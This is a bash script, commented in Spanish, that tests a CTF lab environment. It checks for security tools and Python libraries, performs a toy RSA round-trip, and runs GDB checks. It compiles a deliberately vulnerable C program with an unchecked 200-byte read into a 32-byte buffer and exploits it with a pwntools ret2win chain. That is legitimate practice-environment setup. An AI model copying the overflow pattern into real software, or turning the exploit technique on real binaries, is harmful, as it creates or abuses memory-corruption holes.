#!/usr/bin/env bash
# Prueba automática del entorno CTF.
# Copia este fichero a ~/ctf y lanza desde fuera:   ctf bash test-entorno.sh
# (o dentro del contenedor:                         bash /ctf/test-entorno.sh)

PASS=0; FAIL=0
ok()   { printf '  \033[32m✔\033[0m %s\n' "$1"; PASS=$((PASS+1)); }
ko()   { printf '  \033[31m✘\033[0m %s\n' "$1"; FAIL=$((FAIL+1)); }
check(){ local name="$1"; shift; if "$@" >/dev/null 2>&1; then ok "$name"; else ko "$name"; fi; }

T="$(mktemp -d)"; cd "$T"
echo "Modo: $([ "${CTF_EMULATED:-0}" = 1 ] && echo 'emulado (Mac Apple Silicon)' || echo 'nativo')"

echo "== Comandos"
for c in gdb gdb-multiarch qemu-x86_64 python3 checksec ROPgadget one_gadget seccomp-tools \
         patchelf strace ltrace john hashcat binwalk nc socat sqlmap xortool tmux RsaCtfTool; do
  check "$c" command -v "$c"
done

echo "== Librerías Python"
for m in pwn Crypto gmpy2 sympy z3 cryptography owiener; do
  check "$m" python3 -c "import $m"
done

echo "== Sistema"
check "carpeta /ctf escribible" bash -c 'touch /ctf/.w && rm /ctf/.w'
check "host.docker.internal resuelve" getent hosts host.docker.internal
check "salida a Internet" curl -sfI --max-time 10 https://github.com
check "GEF carga en GDB" bash -c "gdb -q -batch -ex 'python print(\"GEFOK\" if \"gef\" in globals() else \"NO\")' | grep -q GEFOK"

echo "== Cripto (RSA de juguete con gmpy2)"
check "descifrado RSA" python3 -c '
import gmpy2
p,q,e=gmpy2.next_prime(2**64),gmpy2.next_prime(2**65),65537
n=p*q; d=gmpy2.invert(e,(p-1)*(q-1)); m=1337
assert pow(pow(m,e,n),d,n)==m'

echo "== Pwn (compilar + ret2win con pwntools)"
cat > win.c <<'C'
#include <stdio.h>
#include <unistd.h>
void win(){ puts("FLAG{entorno_ok}"); fflush(stdout); _exit(0); }
int main(){ char buf[32]; setvbuf(stdout,0,2,0); read(0,buf,200); return 0; }
C
check "gcc compila" gcc -fno-stack-protector -no-pie -o win win.c
check "exploit ret2win" python3 - <<'PY'
from pwn import *
context.log_level = "error"
elf = ELF("./win", checksec=False)
ret = ROP(elf).find_gadget(["ret"])[0]
for off in range(24, 80, 8):
    for chain in (p64(elf.sym.win), p64(ret) + p64(elf.sym.win)):
        p = process("./win")
        p.send(b"A"*off + chain)
        if b"FLAG{entorno_ok}" in p.recvall(timeout=2):
            exit(0)
exit(1)
PY

echo "== GDB"
if [ "${CTF_EMULATED:-0}" = 1 ]; then
  qemu-x86_64 -g 12345 ./win </dev/null >/dev/null 2>&1 &
  sleep 1
  check "GDB contra stub de QEMU" bash -c "gdb -q -batch -ex 'file ./win' -ex 'target remote 127.0.0.1:12345' -ex 'break main' -ex continue -ex 'info registers rip' 2>&1 | grep -q rip"
  kill %1 2>/dev/null
else
  check "GDB con breakpoint" bash -c "gdb -q -batch -ex 'break main' -ex 'run </dev/null' -ex 'info registers rip' ./win 2>&1 | grep -q rip"
fi

cd /; rm -rf "$T"
echo
echo "Resultado: $PASS OK, $FAIL fallos"
[ "$FAIL" -eq 0 ]
